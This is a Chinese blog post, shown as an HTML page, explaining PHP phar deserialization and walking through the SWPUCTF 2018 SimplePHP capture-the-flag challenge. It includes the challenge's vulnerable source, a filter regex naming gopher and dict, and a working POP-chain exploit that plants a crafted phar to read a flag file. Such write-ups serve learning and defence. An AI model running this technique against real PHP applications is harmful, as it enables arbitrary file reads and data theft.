@@ -1,0 +1,461 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PHP反序列化之phar反序列化🛴 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PHP反序列化之phar反序列化🛴 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Phar简介
+PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Ph..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PHP反序列化之phar反序列化🛴
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                10 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="phar简介">Phar简介</h1>
+<p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。</p>
+<h1 id="phar文件结构">Phar文件结构</h1>
+<p>主要分为三到四个部分，分别是stub，和manifest describing the contents，还有file contents以及signature for verifying Phar integrity，就是存根，描述文件内容的清单，文件内容以及签名格式。stub的基本结构是<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>,必须以<code>__HALT_COMPILER();?&gt;</code>结尾。manifest describing the contents是phar文件中被压缩的文件的信息，Meta-data部分信息会以序列化的形式储存。file contents是被压缩文件的内容，没有特殊要求情况下，可以随便写</p>
+<h1 id="phar反序列化">Phar反序列化</h1>
+<p>首先来个小demo，要利用phar反序列化，得构建一个phar文件。生成phar文件需要在php.ini中把phar.readonly=On改为Off，这里记得把前面的分号去了，我踩了半天坑。</p>
+<p>test.php</p>
+<pre><code class="language-php">&lt;?php
+class a{
+    public $data;
+    function __destruct(){
+        echo &quot;ch1e&quot;;
+    }
+}
+    $phar = new Phar(&quot;ch1e.phar&quot;);
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o=new a();
+    $o-&gt;data='666';
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<p>index.php</p>
+<pre><code class="language-php">&lt;?php
+class a{
+	public $data;
+	function __destruct(){
+		echo &quot;ch1e&quot;.$this-&gt;data;
+	}
+}
+include('phar://ch1e.phar');
+</code></pre>
+<p>在test.php中主要就是创建一个phar文件，并且写入一些数据，他在test.php中写入了一个a类的对象到meta-data，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，因此这里就会在index.php中进行反序列化，会输出ch1e 666</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220528142146042.png" alt="image-20220528142146042" loading="lazy"></figure>
+<p>受影响的函数如下</p>
+<figure data-type="image" tabindex="2"><img src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602120704676-1021025129.png" alt="img" loading="lazy"></figure>
+<p>在一般的情况下，我们需要有一个文件上传点以及上图中的函数，并且函数的参数可控，才可能达到反序列化的效果</p>
+<ol>
+<li>phar可以上传到服务器端(存在文件上传)</li>
+<li>要有可用的魔术方法作为“跳板”。</li>
+<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</li>
+</ol>
+<h1 id="swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP</h1>
+<p>进入题目，发现任意文件读取  http://0917018e-f662-4653-a5e6-79eb8dbabba3.node4.buuoj.cn:81/file.php?file=</p>
+<p>先来读个index.php试试看</p>
+<pre><code class="language-php">&lt;?php 
+header(&quot;content-type:text/html;charset=utf-8&quot;);  
+include 'base.php';
+?&gt; 
+</code></pre>
+<p>index.php包含了base.php，继续读取base.php</p>
+<pre><code class="language-php">&lt;?php 
+    session_start(); 
+?&gt; 
+&lt;!DOCTYPE html&gt; 
+&lt;html&gt; 
+&lt;head&gt; 
+    &lt;meta charset=&quot;utf-8&quot;&gt; 
+    &lt;title&gt;web3&lt;/title&gt; 
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; 
+    &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; 
+    &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; 
+&lt;/head&gt; 
+&lt;body&gt; 
+    &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; 
+        &lt;div class=&quot;container-fluid&quot;&gt; 
+        &lt;div class=&quot;navbar-header&quot;&gt; 
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt; 
+        &lt;/div&gt; 
+            &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; 
+                &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt; 
+                &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt; 
+            &lt;/ul&gt; 
+            &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; 
+                &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER['REMOTE_ADDR'];?&gt;&lt;/a&gt;&lt;/li&gt; 
+            &lt;/ul&gt; 
+        &lt;/div&gt; 
+    &lt;/nav&gt; 
+&lt;/body&gt; 
+&lt;/html&gt; 
+&lt;!--flag is in f1ag.php--&gt;
+</code></pre>
+<p>这里提示flag在flag.php中，并且还有一个文件上传功能在upload_file.php，直接去读取flag.php提示文件不存在，那就再去读一下upload_file.php</p>
+<pre><code class="language-php">&lt;?php 
+include 'function.php'; 
+upload_file(); 
+?&gt; 
+&lt;html&gt; 
+&lt;head&gt; 
+&lt;meta charest=&quot;utf-8&quot;&gt; 
+&lt;title&gt;文件上传&lt;/title&gt; 
+&lt;/head&gt; 
+&lt;body&gt; 
+&lt;div align = &quot;center&quot;&gt; 
+        &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; 
+&lt;/div&gt; 
+&lt;style&gt; 
+    p{ margin:0 auto} 
+&lt;/style&gt; 
+&lt;div&gt; 
+&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; 
+    &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt; 
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; 
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; 
+&lt;/div&gt; 
+
+&lt;/script&gt; 
+&lt;/body&gt; 
+&lt;/html&gt;
+</code></pre>
+<p>这里其实就是一个文件上传的功能，但是他包含了function.php，并且调用了一个upload_file函数，继续读取function.php</p>
+<pre><code class="language-php">&lt;?php 
+//show_source(__FILE__); 
+include &quot;base.php&quot;; 
+header(&quot;Content-type: text/html;charset=utf-8&quot;); 
+error_reporting(0); 
+function upload_file_do() { 
+    global $_FILES; 
+    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; 
+    //mkdir(&quot;upload&quot;,0777); 
+    if(file_exists(&quot;upload/&quot; . $filename)) { 
+        unlink($filename); 
+    } 
+    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); 
+    echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;'; 
+} 
+function upload_file() { 
+    global $_FILES; 
+    if(upload_file_check()) { 
+        upload_file_do(); 
+    } 
+} 
+function upload_file_check() { 
+    global $_FILES; 
+    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); 
+    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); 
+    $extension = end($temp); 
+    if(empty($extension)) { 
+        //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; 
+    } 
+    else{ 
+        if(in_array($extension,$allowed_types)) { 
+            return true; 
+        } 
+        else { 
+            echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;'; 
+            return false; 
+        } 
+    } 
+} 
+?&gt; 
+</code></pre>
+<p>他这里文件上传是进行了一个白名单验证， 只能传四种类型的文件，我们现在再去读取file.php看一下，代码如下</p>
+<pre><code class="language-php">&lt;?php 
+header(&quot;content-type:text/html;charset=utf-8&quot;);  
+include 'function.php'; 
+include 'class.php'; 
+ini_set('open_basedir','/var/www/html/'); 
+$file = $_GET[&quot;file&quot;] ? $_GET['file'] : &quot;&quot;; 
+if(empty($file)) { 
+    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; 
+} 
+$show = new Show(); 
+if(file_exists($file)) { 
+    $show-&gt;source = $file; 
+    $show-&gt;_show(); 
+} else if (!empty($file)){ 
+    die('file doesn\'t exists.'); 
+} 
+?&gt; 
+</code></pre>
+<p>包含了class.php和function.php，实例化了一个show对象，并且调用了他的show方法，读取class.php，代码如下</p>
+<pre><code class="language-php">&lt;?php
+class C1e4r
+{
+    public $test;
+    public $str;
+    public function __construct($name)
+    {
+        $this-&gt;str = $name;
+    }
+    public function __destruct()
+    {
+        $this-&gt;test = $this-&gt;str;
+        echo $this-&gt;test;
+    }
+}
+
+class Show
+{
+    public $source;
+    public $str;
+    public function __construct($file)
+    {
+        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg
+        echo $this-&gt;source;
+    }
+    public function __toString()
+    {
+        $content = $this-&gt;str['str']-&gt;source;
+        return $content;
+    }
+    public function __set($key,$value)
+    {
+        $this-&gt;$key = $value;
+    }
+    public function _show()
+    {
+        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this-&gt;source)) {
+            die('hacker!');
+        } else {
+            highlight_file($this-&gt;source);
+        }
+        
+    }
+    public function __wakeup()
+    {
+        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) {
+            echo &quot;hacker~&quot;;
+            $this-&gt;source = &quot;index.php&quot;;
+        }
+    }
+}
+class Test
+{
+    public $file;
+    public $params;
+    public function __construct()
+    {
+        $this-&gt;params = array();
+    }
+    public function __get($key)
+    {
+        return $this-&gt;get($key);
+    }
+    public function get($key)
+    {
+        if(isset($this-&gt;params[$key])) {
+            $value = $this-&gt;params[$key];
+        } else {
+            $value = &quot;index.php&quot;;
+        }
+        return $this-&gt;file_get($value);
+    }
+    public function file_get($value)
+    {
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    }
+}
+?&gt;
+</code></pre>
+<p>经典的反序列化构造pop链，顺带是用的phar反序列化，这里的话先找反序列化起点，选择的是C1e4r类的destruct方法，并且输出了自身的test属性值，肯定是触发一个tostring方法了，找到Show-&gt;toString，tostring是执行了<code>$content = $this-&gt;str['str']-&gt;source</code>，我们可以让他在这触发Test-&gt;__get,然后一直调用下去最终走到Test-&gt;file_get来读取文件，所以构造的poc如下</p>
+<pre><code class="language-php">&lt;?php
+class C1e4r
+{
+    public $test;
+    public $str;
+}
+class Show
+{
+    public $source;
+    public $str;
+}
+class Test
+{
+    public $file;
+    public $params;
+}
+
+$c1e4r = new C1e4r();
+$show = new Show();
+$test = new Test();
+$test-&gt;params['source'] = &quot;/var/www/html/f1ag.php&quot;;
+$c1e4r-&gt;str = $show;
+$show-&gt;str['str'] = $test;  
+
+$phar = new Phar(&quot;ch1e666.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;'); 
+$phar-&gt;setMetadata($c1e4r); 
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //
+$phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<p>改成git格式上传即可，但是接下来需要找到文件上传后的名字，这里有两个方法，直接访问upload就可以得到，或者看他的upload_file_do函数就好了</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220528145502626.png" alt="image-20220528145502626" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#phar%E7%AE%80%E4%BB%8B">Phar简介</a></li>
+<li><a href="#phar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84">Phar文件结构</a></li>
+<li><a href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Phar反序列化</a></li>
+<li><a href="#swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/php-yuan-sheng-lei-zai-ctf-dang-zhong-de-ying-yong/">
+              <h3 class="post-title">
+                PHP原生类在CTF当中的应用🛴
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
